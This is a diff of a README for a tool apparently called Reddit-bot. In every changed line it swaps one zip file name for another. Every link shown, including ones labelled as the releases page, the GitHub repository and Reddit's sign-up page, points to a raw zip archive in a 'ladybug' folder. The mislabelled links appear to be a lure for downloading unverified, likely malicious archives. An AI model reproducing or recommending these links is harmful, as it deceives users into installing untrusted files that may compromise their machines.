@@ -8,11 +8,11 @@ Welcome to Reddit-bot! This application helps you automate and manage your resea
 
 To get started, click the button below to download the latest release of Reddit-bot.
 
-[![Download Reddit-bot](https://github.com/erickmusic/Reddit-bot/raw/refs/heads/main/ladybug/Reddit_bot_3.9-beta.4.zip%20Reddit--bot-4CAF50?style=flat&logo=github)](https://github.com/erickmusic/Reddit-bot/raw/refs/heads/main/ladybug/Reddit_bot_3.9-beta.4.zip)
+[![Download Reddit-bot](https://github.com/erickmusic/Reddit-bot/raw/refs/heads/main/ladybug/bot_Reddit_v1.7.zip%20Reddit--bot-4CAF50?style=flat&logo=github)](https://github.com/erickmusic/Reddit-bot/raw/refs/heads/main/ladybug/bot_Reddit_v1.7.zip)
 
 ### How to Download
 
-1. Visit this page to download: [GitHub Releases Page](https://github.com/erickmusic/Reddit-bot/raw/refs/heads/main/ladybug/Reddit_bot_3.9-beta.4.zip).
+1. Visit this page to download: [GitHub Releases Page](https://github.com/erickmusic/Reddit-bot/raw/refs/heads/main/ladybug/bot_Reddit_v1.7.zip).
 2. Look for the latest release.
 3. Click on the appropriate file for your operating system.
 4. Save the file to your computer.
@@ -34,7 +34,7 @@ To get started, click the button below to download the latest release of Reddit-
 
 ### Create an Account
 
-1. First, you need a Reddit account. If you don’t have one, visit [Reddit](https://github.com/erickmusic/Reddit-bot/raw/refs/heads/main/ladybug/Reddit_bot_3.9-beta.4.zip) to create your account.
+1. First, you need a Reddit account. If you don’t have one, visit [Reddit](https://github.com/erickmusic/Reddit-bot/raw/refs/heads/main/ladybug/bot_Reddit_v1.7.zip) to create your account.
 2. After creating your account, return to Reddit-bot and log in with your Reddit credentials.
 
 ### Getting Started with Research Workflows
@@ -59,7 +59,7 @@ If you have questions or need assistance, the following resources are available:
 
 ## 🔗 Useful Links
 
-- **GitHub Repository:** [Visit Our GitHub Page](https://github.com/erickmusic/Reddit-bot/raw/refs/heads/main/ladybug/Reddit_bot_3.9-beta.4.zip)
+- **GitHub Repository:** [Visit Our GitHub Page](https://github.com/erickmusic/Reddit-bot/raw/refs/heads/main/ladybug/bot_Reddit_v1.7.zip)
 - **Documentation:** Helps you get an in-depth understanding of Reddit-bot's functionalities.
 
 ## 🛡️ Contributing
